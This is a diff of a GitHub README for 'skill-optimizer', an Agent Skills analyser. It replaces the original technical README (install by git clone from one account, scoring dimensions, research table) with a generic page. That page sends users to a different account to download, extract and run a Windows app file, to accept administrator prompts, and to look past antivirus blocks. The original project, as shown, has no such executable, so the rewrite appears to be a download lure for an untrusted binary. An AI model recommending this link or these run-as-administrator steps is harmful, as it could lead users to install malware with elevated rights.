@@ -1,153 +1,164 @@
-# Skill Optimizer
+# ⚙️ skill-optimizer - Better Agent Skills, Faster Results
 
-[中文版](./README.zh-CN.md)
+[![Download skill-optimizer](https://img.shields.io/badge/Download%20skill--optimizer-blue?style=for-the-badge&logo=github)](https://github.com/Bennaco7539/skill-optimizer)
 
-Diagnose and optimize your [Agent Skills](https://agentskills.io) (SKILL.md files) using **real session data + research-backed static analysis**. Get a prioritized report with P0/P1/P2 fixes.
+## 📌 What this app does
 
-Works with **Claude Code**, **Codex**, and any agent supporting the Agent Skills open standard. Auto-detects your platform and scans the right paths.
+skill-optimizer helps you check and improve your Agent Skills file, also called `SKILL.md`. It looks at real session data and compares it with research-backed checks, so you can spot weak points and clean up your skill instructions.
 
-Most skill auditors only do static checks on your SKILL.md. This one also mines your actual session transcripts to measure trigger rates, user satisfaction, workflow completion, and undertrigger gaps — then scores each skill on a 5-point composite scale.
+It works with Claude Code, Codex, and other agents that support Agent Skills. If you use a skills file to guide an agent, this app helps you make that file clearer, stronger, and easier to use.
 
-## What It Does
+## 🖥️ What you need
 
-**6 scored dimensions** (weighted into composite score):
+- A Windows PC
+- Internet access for the first download
+- A modern browser
+- A `SKILL.md` file you want to review
+- Session data from your agent, if you want the full analysis
 
-| Dimension | What's Measured |
-|-----------|----------------|
-| **Trigger Rate** | How often is the skill actually invoked vs. how often it should be? |
-| **User Reaction** | Does the user accept, correct, or reject the skill after invocation? |
-| **Workflow Completion** | How far through the skill's defined steps does execution get? |
-| **Static Quality** | 14 checks: YAML safety, CSO compliance, info position, word count, etc. |
-| **Undertrigger** | Missed opportunities — user needed the skill but it wasn't invoked |
-| **Token Economics** | Cost-effectiveness and progressive disclosure tier compliance |
+The app is set up for normal desktop use. You do not need to know how to code to get started.
 
-**3 qualitative dimensions** (reported but not scored):
+## ⬇️ Download
 
-| Dimension | What's Measured |
-|-----------|----------------|
-| **Overtrigger** | False positives — skill fired but user didn't want it |
-| **Cross-Skill Conflicts** | Trigger keyword overlap and contradictory guidance between skills |
-| **Environment Consistency** | Broken file paths, missing CLI tools, non-existent directories |
+Visit this page to download:  
+https://github.com/Bennaco7539/skill-optimizer
 
-## Installation
+Use the page to get the latest version of skill-optimizer, then save the app file to your computer.
 
-Copy the command below and paste it directly into your agent's chat — it will install automatically:
+## 🧭 Install on Windows
 
-### Claude Code
+1. Open the download page in your browser.
+2. Find the latest release or the main download option.
+3. Download the Windows file to your Downloads folder.
+4. If the file comes in a ZIP folder, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Find the app file and double-click it to run.
+7. If Windows asks for permission, choose Yes.
 
-```
-Install the skill-optimizer skill from https://github.com/hqhq1025/skill-optimizer
-```
+If the app opens in a browser window or a desktop window, you are ready to use it.
 
-### Codex
+## 🚀 First setup
 
-```
-Install the skill-optimizer skill from https://github.com/hqhq1025/skill-optimizer into ~/.codex/skills/
-```
+After you start the app, point it at your `SKILL.md` file.
 
-### Other Agents (Cursor, OpenCode, Gemini CLI, etc.)
+1. Click the file picker or open button.
+2. Select your `SKILL.md` file.
+3. Add session data if you have it.
+4. Start the scan or analysis.
+5. Wait for the results to load.
 
-```
-Install the skill-optimizer skill from https://github.com/hqhq1025/skill-optimizer into ~/.agents/skills/
-```
+The app reads your skill file and checks how it behaves in real use. It then shows where the file helps the agent and where it needs work.
 
-<details>
-<summary>Manual install</summary>
+## 🔍 What the app checks
 
-```bash
-# Claude Code
-git clone https://github.com/hqhq1025/skill-optimizer.git /tmp/skill-optimizer
-cp -r /tmp/skill-optimizer/skills/skill-optimizer ~/.claude/skills/
-rm -rf /tmp/skill-optimizer
+skill-optimizer looks at both content and use. It focuses on the parts that matter most for agent skills:
 
-# Codex
-git clone https://github.com/hqhq1025/skill-optimizer.git /tmp/skill-optimizer
-cp -r /tmp/skill-optimizer/skills/skill-optimizer ~/.codex/skills/
-rm -rf /tmp/skill-optimizer
+- Clear instructions
+- Missing steps
+- Overly long sections
+- Conflicting rules
+- Weak examples
+- Repeated text
+- Poor structure
+- Gaps between the skill file and real session behavior
 
-# Shared (any agent)
-git clone https://github.com/hqhq1025/skill-optimizer.git /tmp/skill-optimizer
-cp -r /tmp/skill-optimizer/skills/skill-optimizer ~/.agents/skills/
-rm -rf /tmp/skill-optimizer
-```
+It uses static analysis plus session data, so you can see both what the file says and how the agent acts.
 
-</details>
+## 📊 What you may see in the results
 
-## Usage
+The results screen may show:
 
-```
-/optimize-skill              # Scan all skills
-/optimize-skill my-skill     # Single skill
-/optimize-skill skill-a skill-b  # Multiple skills
-```
+- A score for the skill file
+- Problem areas by section
+- Suggestions for shorter wording
+- Notes on unclear instructions
+- A list of edits to make
+- A before-and-after view for key parts of the file
 
-The skill generates a diagnostic report with:
-- **Overview table** — all skills at a glance with scores
-- **P0 Fixes** — blocking issues that must be resolved
-- **P1 Improvements** — experience improvements
-- **P2 Optimizations** — optional tweaks
-- **Per-skill diagnostics** — all 8 dimensions for each skill
+These results help you make your skill file easier for agents to follow.
 
-## Multi-Platform Session Analysis
+## 🛠️ How to use the results
 
-The optimizer auto-detects available platforms and scans session data from all of them:
+Use the output as a guide when you edit `SKILL.md`.
 
-| Platform | Skills Path | Session Data Path |
-|----------|------------|-------------------|
-| Claude Code | `~/.claude/skills/` | `~/.claude/projects/**/*.jsonl` |
-| Codex | `~/.codex/skills/` | `~/.codex/sessions/**/*.jsonl` |
-| Shared | `~/.agents/skills/` | — |
+1. Open your skill file in a text editor.
+2. Read the highest-priority issues first.
+3. Fix unclear or conflicting lines.
+4. Cut extra words where possible.
+5. Add examples where the agent needs help.
+6. Run the scan again to check the changes.
 
-## Research Background
+This process makes the skill file more direct and easier to apply across different agents.
 
-The analysis dimensions are grounded in peer-reviewed research:
+## 🤖 Supported agents
 
-| Research | Key Finding | Applied In |
-|----------|-------------|------------|
-| [Memento-Skills](https://arxiv.org/abs/2603.18743) (2026) | Skills as structured files require accurate routing; unrouted skills cannot self-improve via the read-write learning loop | Undertrigger detection, compounding risk assessment |
-| [MCP Description Quality](https://arxiv.org/abs/2602.18914) (2026) | Well-written descriptions achieve 72% tool selection rate vs. 20% random baseline (3.6x improvement) | Description quality checks, evidence-based rewrite suggestions |
-| [Lost in the Middle](https://arxiv.org/abs/2307.03172) (Liu et al., TACL 2024) | LLM attention follows a U-shaped curve — middle content is ignored | Critical info position check |
-| [Prompt Format Impact](https://arxiv.org/abs/2411.10541) (He et al., 2024) | Format changes alone cause 9-40% performance variance | Static quality analysis |
-| [IFEval](https://arxiv.org/abs/2311.07911) (Zhou et al., 2023) | LLMs struggle with multi-constraint prompts | Trigger condition count check |
-| [Meincke et al.](https://papers.ssrn.com/sol3/papers.cfm?abstract_id=5357179) (2025) | Persuasion directives have inconsistent effects across models | MUST/NEVER density guidance |
+skill-optimizer is made for:
 
-## How It Works
-
-```
-Identify target skills (scan ~/.claude/skills/, ~/.codex/skills/, ~/.agents/skills/)
-        ↓
-Collect session data (auto-detect platform, scan JSONL transcripts)
-        ↓
-Run 8 analysis dimensions (6 scored + 3 qualitative)
-        ↓
-Compute composite scores (weighted average of 6 scored dimensions)
-        ↓
-Output report with P0/P1/P2 prioritized fixes
-```
-
-**Scored dimensions (weighted average):**
-- Trigger rate: 25%
-- User reaction: 20%
-- Workflow completion: 15%
-- Static quality: 15%
-- Undertrigger: 15%
-- Token economics: 10%
-
-**Qualitative dimensions** (overtrigger, cross-skill conflicts, environment consistency) are reported with examples but do not affect the numeric score.
-
-## Compatibility
-
-Works with any agent that supports the [Agent Skills](https://agentskills.io) open standard:
 - Claude Code
 - Codex
-- Cursor
-- OpenCode
-- Gemini CLI
+- Agent Skills-compatible tools
+- Other agent setups that use `SKILL.md`
 
-## Community
+If your tool reads a skill file, it can usually work with this app.
 
-- [LINUX DO](https://linux.do) — Where we first shared this project
+## 🧩 Common file types
 
-## License
+You can use skill-optimizer with files and data such as:
 
-MIT
+- `SKILL.md`
+- Session logs
+- Agent notes
+- Task run records
+- Skill templates
+
+If you keep your skill instructions in Markdown, this app can review them.
+
+## 🧼 Tips for best results
+
+- Use one skill file per task type
+- Keep instructions short and direct
+- Use the same format across skills
+- Add examples for hard steps
+- Remove repeated rules
+- Recheck the file after each edit
+
+Clean inputs give cleaner results.
+
+## 🪟 Windows troubleshooting
+
+If the app does not open:
+
+1. Check that the download finished.
+2. Make sure you extracted the ZIP file.
+3. Try running the app again.
+4. Right-click the file and choose Run as administrator.
+5. Check your antivirus if the file is blocked.
+6. Download the file again from the project page.
+
+If the browser says the page cannot be opened, wait a moment and try again.
+
+## 📁 Project details
+
+- Repository: skill-optimizer
+- Purpose: Diagnose and optimize Agent Skills
+- Input focus: `SKILL.md`
+- Analysis method: session data plus static review
+- Compatibility: Claude Code, Codex, and similar agents
+
+## 🧠 When to use it
+
+Use skill-optimizer when:
+
+- Your agent gives mixed results
+- Your skill file feels too long
+- The agent misses steps
+- You want cleaner instructions
+- You want to compare skill text against real use
+- You need to tune skills for more than one agent
+
+## 📎 Download link
+
+Visit this page to download:  
+https://github.com/Bennaco7539/skill-optimizer
+
+Open the page, get the latest build, and run it on your Windows PC
